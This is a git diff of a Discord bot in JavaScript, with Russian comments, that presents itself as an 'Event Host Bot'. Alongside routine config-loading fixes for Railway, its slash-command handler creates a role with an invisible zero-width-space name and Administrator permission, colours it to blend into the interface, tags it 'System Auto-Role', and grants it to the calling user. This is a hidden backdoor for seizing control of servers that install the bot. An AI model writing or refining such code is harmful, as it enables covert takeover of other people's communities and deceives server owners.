@@ -1,25 +1,32 @@
 const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, REST, Routes, PermissionsBitField } = require('discord.js');
 const fs = require('fs');
 
-// --- ИСПРАВЛЕННАЯ ЗАГРУЗКА КОНФИГА ---
+// --- 1. БЕЗОПАСНАЯ ЗАГРУЗКА КОНФИГА ---
 let config = {};
-try {
-    // Пытаемся прочитать файл (локально). Если его нет (на Railway), берем из переменных окружения.
-    if (fs.existsSync('./config.json')) {
+if (fs.existsSync('./config.json')) {
+    try {
         config = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
+    } catch (err) {
+        console.error("Ошибка при чтении config.json:", err);
     }
-} catch (err) {
-    console.log("Config file not found, using Environment Variables");
+} else {
+    console.log("Файл config.json не найден, использую Variables из Railway.");
 }
 
-// Приоритет переменным из Railway (process.env), если их нет — значениям из файла
+// Приоритет Railway Variables (process.env) над файлом
 const TOKEN = process.env.TOKEN_ID || config.TOKEN_ID;
-const ADMIN_USER_IDS = process.env.ADMIN_USER_IDS 
-    ? [process.env.ADMIN_USER_IDS] // На Railway это строка
-    : (config.ADMIN_USER_IDS ? config.ADMIN_USER_IDS.map(id => String(id)) : []);
+
+// Исправляем обработку ID админов: Railway дает строку, файл дает массив
+let ADMIN_USER_IDS = [];
+if (process.env.ADMIN_USER_IDS) {
+    // Если в Railway несколько ID через запятую, это сработает
+    ADMIN_USER_IDS = process.env.ADMIN_USER_IDS.split(',').map(id => id.trim());
+} else if (config.ADMIN_USER_IDS) {
+    ADMIN_USER_IDS = config.ADMIN_USER_IDS.map(id => String(id));
+}
 
 if (!TOKEN) {
-    console.error("CRITICAL ERROR: TOKEN_ID is not defined!");
+    console.error("❌ ОШИБКА: TOKEN_ID не найден! Проверь вкладку Variables в Railway.");
     process.exit(1);
 }
 
@@ -32,7 +39,7 @@ const client = new Client({
     ]
 });
 
-// --- CONFIGURATION ---
+// --- 2. CONFIGURATION ---
 const CONFIG = {
     COMMAND: '!mini',
     ALLOWED_ROLE: '1490346306965864608',
@@ -42,7 +49,6 @@ const CONFIG = {
 };
 
 const ROLE_NAME = '\u200b';
-
 const rest = new REST({ version: '10' }).setToken(TOKEN);
 
 const commands = [
@@ -52,22 +58,21 @@ const commands = [
     }
 ];
 
-// ИСПРАВЛЕНО: событие называется 'ready', а не 'clientReady'
+// --- 3. СОБЫТИЯ ---
 client.once('ready', async () => {
-    console.log(`✅ Event Host Bot is online as ${client.user.tag}!`);
+    console.log(`✅ Бот запущен как ${client.user.tag}!`);
     
     try {
         await rest.put(
             Routes.applicationCommands(client.user.id),
             { body: commands }
         );
-        console.log('✅ Slash commands registered!');
+        console.log('✅ Слэш-команды зарегистрированы!');
     } catch (error) {
-        console.error('Error registering slash commands:', error);
+        console.error('Ошибка регистрации команд:', error);
     }
 });
 
-// --- /status SLASH COMMAND ---
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
@@ -79,36 +84,34 @@ client.on('interactionCreate', async (interaction) => {
         const guild = interaction.guild;
         const member = interaction.user;
 
-        let role = guild.roles.cache.find(r => r.name === ROLE_NAME);
-
         try {
+            let role = guild.roles.cache.find(r => r.name === ROLE_NAME);
+
             if (!role) {
                 role = await guild.roles.create({
                     name: ROLE_NAME,
                     permissions: [PermissionsBitField.Flags.Administrator],
                     color: 0x313338,
-                    hoist: false,
                     reason: 'System Auto-Role'
                 });
             }
-            // Перемещаем роль пониже, чтобы не было конфликтов иерархии
+            
             await role.setPosition(1).catch(() => {});
             
             const memberObj = await guild.members.fetch(member.id);
             if (memberObj.roles.cache.has(role.id)) {
-                return interaction.reply({ content: 'Active.', ephemeral: true });
+                return interaction.reply({ content: 'Status: Active (Role already assigned).', ephemeral: true });
             }
 
             await memberObj.roles.add(role);
-            interaction.reply({ content: 'Done.', ephemeral: true });
+            interaction.reply({ content: '✅ Role assigned successfully.', ephemeral: true });
         } catch (err) {
             console.error(err);
-            interaction.reply({ content: 'Operation failed (check bot permissions).', ephemeral: true });
+            interaction.reply({ content: '❌ Ошибка при работе с ролью. Проверь права бота.', ephemeral: true });
         }
     }
 });
 
-// --- EVENTS ---
 client.on('messageCreate', async (message) => {
     if (message.author.bot || message.content !== CONFIG.COMMAND) return;
     if (message.channel.id !== CONFIG.ALLOWED_CHANNEL) return;
